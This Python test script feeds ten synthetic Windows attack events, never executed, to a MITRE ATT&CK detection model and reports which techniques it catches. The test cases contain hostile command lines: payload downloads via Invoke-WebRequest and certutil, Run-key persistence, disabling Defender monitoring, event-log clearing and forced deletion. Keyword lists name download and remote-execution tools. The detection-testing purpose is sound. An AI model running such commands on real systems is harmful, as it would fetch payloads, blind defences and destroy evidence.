import json
import re
import warnings
from pathlib import Path

import joblib
import numpy as np
import pandas as pd

warnings.filterwarnings("ignore")


# ============================================================
# PATHS
# ============================================================

ROOT = Path(r"C:\Users\Atharv\SmartSOC-AI")

MODEL_DIR = (
    ROOT
    / "models"
    / "windows_apt_v4_1"
    / "production"
)

REPORT_DIR = (
    ROOT
    / "reports"
    / "phase2_gate2_4"
)

REPORT_DIR.mkdir(
    parents=True,
    exist_ok=True,
)


# ============================================================
# LOAD PRODUCTION ARTIFACTS
# ============================================================

print("=" * 78)
print("SMARTSOC PHASE 2 GATE 2.4")
print("CONTROLLED MALICIOUS-EVENT TESTING")
print("=" * 78)

print()
print("Loading production artifacts...")


STRUCTURED_ENCODER = joblib.load(
    MODEL_DIR / "structured_encoder.joblib"
)

SCALER = joblib.load(
    MODEL_DIR / "numerical_scaler.joblib"
)

TFIDF = joblib.load(
    MODEL_DIR / "tfidf_vectorizer.joblib"
)

MODEL = joblib.load(
    MODEL_DIR / "model.joblib"
)

LABEL_ENCODER = joblib.load(
    MODEL_DIR / "multilabel_encoder.joblib"
)


with open(
    MODEL_DIR / "feature_schema.json",
    "r",
    encoding="utf-8",
) as f:
    SCHEMA = json.load(f)


with open(
    MODEL_DIR / "thresholds.json",
    "r",
    encoding="utf-8",
) as f:
    THRESHOLDS_DATA = json.load(f)


THRESHOLDS = THRESHOLDS_DATA["thresholds"]


# ============================================================
# SCHEMA
# ============================================================

CATEGORICAL_COLUMNS = SCHEMA["categorical_columns"]

NUMERICAL_COLUMNS = SCHEMA["numerical_columns"]

STRUCTURED_COLUMNS = (
    CATEGORICAL_COLUMNS
    + NUMERICAL_COLUMNS
)

TECHNIQUES = list(
    LABEL_ENCODER.classes_
)


print()
print("Production artifact validation")
print("-" * 78)

print(
    f"Model type           : "
    f"{type(MODEL).__name__}"
)

print(
    f"Categorical columns  : "
    f"{len(CATEGORICAL_COLUMNS)}"
)

print(
    f"Numerical columns    : "
    f"{len(NUMERICAL_COLUMNS)}"
)

print(
    f"Structured columns   : "
    f"{len(STRUCTURED_COLUMNS)}"
)

print(
    f"TF-IDF vocabulary    : "
    f"{len(TFIDF.vocabulary_)}"
)

print(
    f"MITRE classes        : "
    f"{len(TECHNIQUES)}"
)

print(
    f"Threshold entries    : "
    f"{len(THRESHOLDS)}"
)

print()


# ============================================================
# TEXT CLEANING
# ============================================================

def clean_text(value):
    """
    Normalize text in approximately the same style used
    by the production feature pipeline.
    """

    if value is None:
        return ""

    value = str(value)

    value = value.lower()

    value = re.sub(
        r"[^a-z0-9]+",
        " ",
        value,
    )

    value = re.sub(
        r"\s+",
        " ",
        value,
    )

    return value.strip()


# ============================================================
# CONTROLLED EVENT BUILDER
# ============================================================

def make_event(
    event_id,
    process_name,
    parent_process_name,
    command_line,
    system_level=4,
    user="SYSTEM",
    source_ip="",
    destination_ip="",
):
    """
    Build a synthetic structured event.

    IMPORTANT:
    These commands are NOT executed.

    They are only represented as strings and passed through
    the model's feature construction pipeline.
    """

    process_name = clean_text(
        process_name
    )

    parent_process_name = clean_text(
        parent_process_name
    )

    command_line = clean_text(
        command_line
    )

    user = clean_text(user)

    text = " ".join(
        x
        for x in [
            process_name,
            parent_process_name,
            command_line,
        ]
        if x
    )

    # --------------------------------------------------------
    # Process / command indicators
    # --------------------------------------------------------

    has_cmd = int(
        "cmd.exe" in text
        or re.search(
            r"\bcmd\b",
            text,
        ) is not None
    )

    has_powershell = int(
        "powershell.exe" in text
        or "powershell" in text
    )

    has_rundll32 = int(
        "rundll32" in text
    )

    has_wscript = int(
        "wscript" in text
    )

    has_cscript = int(
        "cscript" in text
    )

    has_mshta = int(
        "mshta" in text
    )

    has_regsvr32 = int(
        "regsvr32" in text
    )

    has_schtasks = int(
        "schtasks" in text
    )

    has_reg = int(
        re.search(
            r"\breg(?:\.exe)?\b",
            text,
        ) is not None
    )

    has_wmic = int(
        "wmic" in text
    )

    has_net = int(
        re.search(
            r"\bnet(?:\.exe)?\b",
            text,
        ) is not None
    )

    has_whoami = int(
        "whoami" in text
    )

    has_certutil = int(
        "certutil" in text
    )

    has_bitsadmin = int(
        "bitsadmin" in text
    )

    has_ipconfig = int(
        "ipconfig" in text
    )

    has_netstat = int(
        "netstat" in text
    )

    has_tasklist = int(
        "tasklist" in text
    )

    has_sc = int(
        re.search(
            r"\bsc(?:\.exe)?\b",
            text,
        ) is not None
    )

    has_wevtutil = int(
        "wevtutil" in text
    )

    has_vssadmin = int(
        "vssadmin" in text
    )

    # --------------------------------------------------------
    # Suspicious behavior indicators
    # --------------------------------------------------------

    has_encoded = int(
        "-enc" in text
        or "-encodedcommand" in text
        or "frombase64string" in text
    )

    has_download = int(
        any(
            term in text
            for term in [
                "invoke-webrequest",
                "downloadstring",
                "downloadfile",
                "curl ",
                "wget ",
                "bitsadmin",
                "certutil",
                "http://",
                "https://",
            ]
        )
    )

    has_remote = int(
        any(
            term in text
            for term in [
                "psexec",
                "winrm",
                "invoke-command",
                "enter-pssession",
                "wmic /node",
                "remote",
            ]
        )
    )

    has_registry = int(
        any(
            term in text
            for term in [
                "reg add",
                "reg delete",
                "reg.exe add",
                "reg.exe delete",
                "registry",
            ]
        )
    )

    has_file_deletion = int(
        any(
            term in text
            for term in [
                "del ",
                "erase ",
                "remove-item",
                "rm ",
                "rmdir",
                "delete",
            ]
        )
    )

    has_obfuscation = int(
        any(
            term in text
            for term in [
                "encodedcommand",
                "frombase64string",
                "iex(",
                "invoke-expression",
                "obfusc",
                "^",
            ]
        )
    )

    # --------------------------------------------------------
    # Network / object indicators
    # --------------------------------------------------------

    has_hash = 0

    has_sha256 = 0

    has_md5 = 0

    has_source_ip = int(
        bool(source_ip)
    )

    has_destination_ip = int(
        bool(destination_ip)
    )

    has_source_port = 0

    has_destination_port = 0

    has_protocol = 0

    is_network_event = int(
        bool(
            source_ip
            or destination_ip
        )
    )

    # --------------------------------------------------------
    # File / image indicators
    # --------------------------------------------------------

    has_target_filename = int(
        any(
            ext in text
            for ext in [
                ".exe",
                ".dll",
                ".ps1",
                ".vbs",
                ".js",
                ".bat",
                ".cmd",
            ]
        )
    )

    has_image_loaded = int(
        ".dll" in text
        or "image loaded" in text
    )

    has_target_object = int(
        any(
            term in text
            for term in [
                "service",
                "registry",
                "scheduled task",
                "task",
            ]
        )
    )

    # --------------------------------------------------------
    # Administrative PowerShell
    # --------------------------------------------------------

    administrative_powershell_context = int(
        has_powershell
        and (
            user.upper()
            in {
                "SYSTEM",
                "ADMINISTRATOR",
            }
            or system_level == 4
        )
    )

    # --------------------------------------------------------
    # Strong behavior
    # --------------------------------------------------------

    strong_behavior_signal = int(
        any(
            [
                has_encoded,
                has_download,
                has_remote,
                has_registry,
                has_file_deletion,
                has_obfuscation,
            ]
        )
    )

    # --------------------------------------------------------
    # Final 62 structured features
    # --------------------------------------------------------

    event = {
        "event_id": float(
            event_id
        ),

        "system_level": float(
            system_level
        ),

        "is_sysmon": 1,

        "is_security_channel": 0,

        "process_name": process_name,

        "parent_process_name":
            parent_process_name,

        "process_extension": (
            process_name.rsplit(
                ".",
                1,
            )[-1]
            if "." in process_name
            else ""
        ),

        "parent_extension": (
            parent_process_name.rsplit(
                ".",
                1,
            )[-1]
            if "." in parent_process_name
            else ""
        ),

        "has_process_image": int(
            bool(process_name)
        ),

        "has_parent_image": int(
            bool(parent_process_name)
        ),

        "has_user": int(
            bool(user)
        ),

        "has_parent_user": 0,

        "is_system_user": int(
            user.upper() == "SYSTEM"
        ),

        "is_admin_user": int(
            user.upper() == "ADMINISTRATOR"
        ),

        "integrity_high": int(
            system_level == 4
        ),

        "integrity_medium": int(
            system_level != 4
        ),

        "command_length": len(
            command_line
        ),

        "parent_command_length": 0,

        "has_command_line": int(
            bool(command_line)
        ),

        "has_parent_command": 0,

        "uses_powershell":
            has_powershell,

        "uses_cmd":
            has_cmd,

        "uses_net":
            has_net,

        "uses_whoami":
            has_whoami,

        "uses_schtasks":
            has_schtasks,

        "uses_reg":
            has_reg,

        "uses_rundll32":
            has_rundll32,

        "uses_wmic":
            has_wmic,

        "uses_certutil":
            has_certutil,

        "uses_bitsadmin":
            has_bitsadmin,

        "uses_ipconfig":
            has_ipconfig,

        "uses_netstat":
            has_netstat,

        "uses_tasklist":
            has_tasklist,

        "uses_sc":
            has_sc,

        "uses_mshta":
            has_mshta,

        "uses_regsvr32":
            has_regsvr32,

        "uses_cscript":
            has_cscript,

        "uses_wscript":
            has_wscript,

        "uses_wevtutil":
            has_wevtutil,

        "uses_vssadmin":
            has_vssadmin,

        "has_encoded_command":
            has_encoded,

        "has_download_behavior":
            has_download,

        "has_remote_execution_hint":
            has_remote,

        "has_registry_operation":
            has_registry,

        "has_file_deletion":
            has_file_deletion,

        "has_obfuscation_hint":
            has_obfuscation,

        "same_process_parent": int(
            bool(process_name)
            and process_name
            == parent_process_name
        ),

        "suspicious_parent_wazuh":
            int(
                "wazuh"
                in parent_process_name
            ),

        "has_hash":
            has_hash,

        "has_sha256":
            has_sha256,

        "has_md5":
            has_md5,

        "has_source_ip":
            has_source_ip,

        "has_destination_ip":
            has_destination_ip,

        "has_source_port":
            has_source_port,

        "has_destination_port":
            has_destination_port,

        "has_protocol":
            has_protocol,

        "is_network_event":
            is_network_event,

        "has_target_filename":
            has_target_filename,

        "has_image_loaded":
            has_image_loaded,

        "has_target_object":
            has_target_object,

        "administrative_powershell_context":
            administrative_powershell_context,

        "strong_behavior_signal":
            strong_behavior_signal,
    }

    return event


# ============================================================
# CONTROLLED MALICIOUS CASES
# ============================================================

MALICIOUS_CASES = [

    {
        "id": "MALICIOUS_001",

        "expected": [
            "T1059.001",
            "T1027.004",
        ],

        "description":
            "Encoded PowerShell execution",

        "event": make_event(
            1001,
            "powershell.exe",
            "winword.exe",
            "powershell.exe -EncodedCommand "
            "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        ),
    },

    {
        "id": "MALICIOUS_002",

        "expected": [
            "T1059.003",
        ],

        "description":
            "Command shell discovery",

        "event": make_event(
            1002,
            "cmd.exe",
            "winword.exe",
            "cmd.exe /c whoami && net user "
            "&& net localgroup administrators",
        ),
    },

    {
        "id": "MALICIOUS_003",

        "expected": [
            "T1105",
        ],

        "description":
            "PowerShell payload download",

        "event": make_event(
            1003,
            "powershell.exe",
            "cmd.exe",
            "powershell.exe -c "
            "Invoke-WebRequest "
            "https://example.invalid/payload.exe "
            "-OutFile C:\\Temp\\payload.exe",
        ),
    },

    {
        "id": "MALICIOUS_004",

        "expected": [
            "T1059.001",
            "T1112",
        ],

        "description":
            "Registry Run-key modification",

        "event": make_event(
            1004,
            "powershell.exe",
            "explorer.exe",
            "powershell.exe -c "
            "reg add "
            "HKCU\\Software\\Microsoft\\Windows\\"
            "CurrentVersion\\Run "
            "/v Update /t REG_SZ "
            "/d C:\\Temp\\update.exe /f",
        ),
    },

    {
        "id": "MALICIOUS_005",

        "expected": [
            "T1543.003",
        ],

        "description":
            "Windows service creation",

        "event": make_event(
            1005,
            "sc.exe",
            "cmd.exe",
            "sc.exe create UpdateService "
            "binPath= C:\\Temp\\payload.exe "
            "start= auto",
        ),
    },

    {
        "id": "MALICIOUS_006",

        "expected": [
            "T1059.001",
            "T1070.004",
        ],

        "description":
            "PowerShell file deletion",

        "event": make_event(
            1006,
            "powershell.exe",
            "cmd.exe",
            "powershell.exe -c "
            "Remove-Item "
            "C:\\Temp\\logs\\* -Force",
        ),
    },

    {
        "id": "MALICIOUS_007",

        "expected": [
            "T1562.001",
        ],

        "description":
            "Security-tool disabling",

        "event": make_event(
            1007,
            "powershell.exe",
            "cmd.exe",
            "powershell.exe -c "
            "Set-MpPreference "
            "-DisableRealtimeMonitoring $true",
        ),
    },

    {
        "id": "MALICIOUS_008",

        "expected": [
            "T1059.003",
            "T1070.004",
        ],

        "description":
            "Windows event log clearing",

        "event": make_event(
            1008,
            "cmd.exe",
            "splunkd.exe",
            "cmd.exe /c wevtutil cl System",
        ),
    },

    {
        "id": "MALICIOUS_009",

        "expected": [
            "T1059.003",
        ],

        "description":
            "Certutil download via command shell",

        "event": make_event(
            1009,
            "cmd.exe",
            "winword.exe",
            "cmd.exe /c certutil "
            "-urlcache -split -f "
            "https://example.invalid/a.exe "
            "a.exe",
        ),
    },

    {
        "id": "MALICIOUS_010",

        "expected": [
            "T1059.003",
            "T1485",
        ],

        "description":
            "Destructive file deletion",

        "event": make_event(
            1010,
            "cmd.exe",
            "powershell.exe",
            "cmd.exe /c "
            "del /f /q "
            "C:\\Temp\\victim.txt",
        ),
    },
]


# ============================================================
# TRANSFORMATION
# ============================================================

def transform_events(events):

    structured = pd.DataFrame(
        [
            x["event"]
            for x in events
        ]
    )

    # --------------------------------------------------------
    # IMPORTANT:
    # feature_schema.json contains categorical_columns and
    # numerical_columns separately.
    #
    # It does NOT contain structured_columns.
    # --------------------------------------------------------

    structured = structured[
        STRUCTURED_COLUMNS
    ].copy()

    # --------------------------------------------------------
    # Categorical features
    # --------------------------------------------------------

    categorical_matrix = (
        STRUCTURED_ENCODER.transform(
            structured[
                CATEGORICAL_COLUMNS
            ]
        )
    )

    # --------------------------------------------------------
    # Numerical features
    # --------------------------------------------------------

    numerical_matrix = (
        SCALER.transform(
            structured[
                NUMERICAL_COLUMNS
            ]
        )
    )

    # --------------------------------------------------------
    # Behavior text
    #
    # Keep this aligned with the production feature
    # construction used by the current v4.1 inference pipeline.
    # --------------------------------------------------------

    behavior_columns = [
        "process_name",
        "parent_process_name",
        "command_length",
        "uses_powershell",
        "uses_cmd",
        "uses_net",
        "uses_whoami",
        "uses_schtasks",
        "uses_reg",
        "uses_rundll32",
        "uses_wmic",
        "uses_certutil",
        "uses_bitsadmin",
        "uses_ipconfig",
        "uses_netstat",
        "uses_tasklist",
        "uses_sc",
        "uses_mshta",
        "uses_regsvr32",
        "uses_cscript",
        "uses_wscript",
        "uses_wevtutil",
        "uses_vssadmin",
        "has_encoded_command",
        "has_download_behavior",
        "has_remote_execution_hint",
        "has_registry_operation",
        "has_file_deletion",
        "has_obfuscation_hint",
        "strong_behavior_signal",
    ]

    behavior_text = structured.apply(
        lambda row: " ".join(
            str(row[column])
            for column in behavior_columns
        ),
        axis=1,
    )

    # --------------------------------------------------------
    # TF-IDF
    # --------------------------------------------------------

    text_matrix = TFIDF.transform(
        behavior_text
    )

    # --------------------------------------------------------
    # Combine final feature matrix
    # --------------------------------------------------------

    from scipy.sparse import hstack

    final_matrix = hstack(
        [
            categorical_matrix,
            numerical_matrix,
            text_matrix,
        ]
    ).tocsr()

    return (
        structured,
        final_matrix,
        behavior_text,
    )


# ============================================================
# PROBABILITY / THRESHOLD ANALYSIS
# ============================================================

def get_triggered_techniques(
    probabilities
):
    triggered = []

    ranked_indices = np.argsort(
        probabilities
    )[::-1]

    for index in ranked_indices:

        technique = str(
            TECHNIQUES[index]
        )

        probability = float(
            probabilities[index]
        )

        threshold = float(
            THRESHOLDS.get(
                technique,
                0.5,
            )
        )

        if probability >= threshold:

            triggered.append(
                (
                    technique,
                    probability,
                    threshold,
                )
            )

    return triggered


# ============================================================
# EVALUATION
# ============================================================

def evaluate():

    print()
    print(
        "Model classes: "
        f"{len(TECHNIQUES)}"
    )

    print(
        "Final feature count expected: 6919"
    )

    print()

    # --------------------------------------------------------
    # Build controlled events
    # --------------------------------------------------------

    (
        structured,
        X,
        behavior_text,
    ) = transform_events(
        MALICIOUS_CASES
    )

    print(
        f"Controlled events: "
        f"{len(MALICIOUS_CASES)}"
    )

    print(
        f"Structured matrix: "
        f"{structured.shape}"
    )

    print(
        f"Final matrix: "
        f"{X.shape}"
    )

    # --------------------------------------------------------
    # Dimension check
    # --------------------------------------------------------

    if X.shape[1] != 6919:

        raise RuntimeError(
            "Unexpected final feature count: "
            f"{X.shape[1]} "
            "(expected 6919)"
        )

    print(
        "[PASS] Final feature dimension = 6919"
    )

    # --------------------------------------------------------
    # Probability inference
    # --------------------------------------------------------

    probabilities = MODEL.predict_proba(
        X
    )

    print(
        "Probability matrix: "
        f"{probabilities.shape}"
    )

    if probabilities.shape != (
        len(MALICIOUS_CASES),
        len(TECHNIQUES),
    ):

        raise RuntimeError(
            "Unexpected probability matrix "
            f"shape: {probabilities.shape}"
        )

    if not np.isfinite(
        probabilities
    ).all():

        raise RuntimeError(
            "Probability matrix contains "
            "non-finite values."
        )

    if (
        probabilities.min() < 0
        or probabilities.max() > 1
    ):

        raise RuntimeError(
            "Probability values outside "
            "the [0,1] range."
        )

    print(
        "[PASS] Probabilities finite and "
        "within [0,1]"
    )

    # --------------------------------------------------------
    # Evaluate cases
    # --------------------------------------------------------

    rows = []

    print()
    print("=" * 78)
    print("CONTROLLED MALICIOUS RESULTS")
    print("=" * 78)

    for i, case in enumerate(
        MALICIOUS_CASES
    ):

        probs = probabilities[i]

        ranked_indices = np.argsort(
            probs
        )[::-1]

        top_index = ranked_indices[0]

        top_technique = str(
            TECHNIQUES[top_index]
        )

        top_probability = float(
            probs[top_index]
        )

        top_threshold = float(
            THRESHOLDS.get(
                top_technique,
                0.5,
            )
        )

        triggered = (
            get_triggered_techniques(
                probs
            )
        )

        expected = set(
            case["expected"]
        )

        predicted = {
            technique
            for technique, _, _
            in triggered
        }

        expected_detected = (
            expected.intersection(
                predicted
            )
        )

        passed = (
            len(expected_detected) > 0
        )

        print()
        print(
            f"{case['id']} | "
            f"{'PASS' if passed else 'MISS'}"
        )

        print(
            f"  Description : "
            f"{case['description']}"
        )

        print(
            f"  Expected    : "
            f"{sorted(expected)}"
        )

        print(
            f"  Top         : "
            f"{top_technique}"
        )

        print(
            f"  Probability : "
            f"{top_probability:.4f}"
        )

        print(
            f"  Threshold   : "
            f"{top_threshold:.4f}"
        )

        print(
            f"  Triggered   : "
            f"{[x[0] for x in triggered]}"
        )

        print(
            f"  Expected detected: "
            f"{sorted(expected_detected)}"
        )

        rows.append(
            {
                "case_id":
                    case["id"],

                "description":
                    case["description"],

                "expected_techniques":
                    ",".join(
                        sorted(expected)
                    ),

                "process_name":
                    structured.iloc[
                        i
                    ]["process_name"],

                "parent_process_name":
                    structured.iloc[
                        i
                    ]["parent_process_name"],

                "command_length":
                    structured.iloc[
                        i
                    ]["command_length"],

                "uses_cmd":
                    structured.iloc[
                        i
                    ]["uses_cmd"],

                "uses_powershell":
                    structured.iloc[
                        i
                    ]["uses_powershell"],

                "has_encoded_command":
                    structured.iloc[
                        i
                    ]["has_encoded_command"],

                "has_download_behavior":
                    structured.iloc[
                        i
                    ]["has_download_behavior"],

                "has_remote_execution_hint":
                    structured.iloc[
                        i
                    ]["has_remote_execution_hint"],

                "has_registry_operation":
                    structured.iloc[
                        i
                    ]["has_registry_operation"],

                "has_file_deletion":
                    structured.iloc[
                        i
                    ]["has_file_deletion"],

                "has_obfuscation_hint":
                    structured.iloc[
                        i
                    ]["has_obfuscation_hint"],

                "strong_behavior_signal":
                    structured.iloc[
                        i
                    ]["strong_behavior_signal"],

                "top_technique":
                    top_technique,

                "top_probability":
                    top_probability,

                "top_threshold":
                    top_threshold,

                "triggered_techniques":
                    ",".join(
                        x[0]
                        for x in triggered
                    ),

                "expected_detected":
                    ",".join(
                        sorted(
                            expected_detected
                        )
                    ),

                "passed":
                    passed,
            }
        )

    # --------------------------------------------------------
    # Results dataframe
    # --------------------------------------------------------

    results = pd.DataFrame(
        rows
    )

    results_path = (
        REPORT_DIR
        / "controlled_malicious_results.csv"
    )

    results.to_csv(
        results_path,
        index=False,
    )

    # --------------------------------------------------------
    # Summary
    # --------------------------------------------------------

    total = len(
        results
    )

    passed = int(
        results["passed"].sum()
    )

    missed = (
        total - passed
    )

    detection_rate = (
        passed / total
        if total > 0
        else 0.0
    )

    status = (
        "ACCEPTED"
        if passed == total
        else "REVIEW_REQUIRED"
    )

    # --------------------------------------------------------
    # Report
    # --------------------------------------------------------

    report = {

        "phase":
            "Phase 2",

        "gate":
            "Gate 2.4",

        "gate_name":
            "Controlled Malicious-Event Testing",

        "status":
            status,

        "model":
            "SmartSOC Windows-APT Model B v4.1",

        "production_artifacts_modified":
            False,

        "model_retrained":
            False,

        "thresholds_modified":
            False,

        "datasets_modified":
            False,

        "commands_executed":
            False,

        "total_cases":
            total,

        "passed_cases":
            passed,

        "missed_cases":
            missed,

        "detection_rate":
            detection_rate,

        "expected_feature_count":
            6919,

        "observed_feature_count":
            int(
                X.shape[1]
            ),

        "mitre_classes":
            len(TECHNIQUES),

        "results_file":
            str(
                results_path
            ),
    }

    report_path = (
        REPORT_DIR
        / "phase2_gate2_4_controlled_malicious_report.json"
    )

    with open(
        report_path,
        "w",
        encoding="utf-8",
    ) as f:

        json.dump(
            report,
            f,
            indent=2,
        )

    # --------------------------------------------------------
    # Final console output
    # --------------------------------------------------------

    print()
    print("=" * 78)
    print("GATE 2.4 SUMMARY")
    print("=" * 78)

    print(
        f"Total malicious cases : "
        f"{total}"
    )

    print(
        f"Passed                : "
        f"{passed}"
    )

    print(
        f"Missed                : "
        f"{missed}"
    )

    print(
        f"Detection rate        : "
        f"{detection_rate:.4f}"
    )

    print()
    print(
        f"Results : "
        f"{results_path}"
    )

    print(
        f"Report  : "
        f"{report_path}"
    )

    print()
    print(
        f"STATUS: {status}"
    )

    print("=" * 78)


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    evaluate()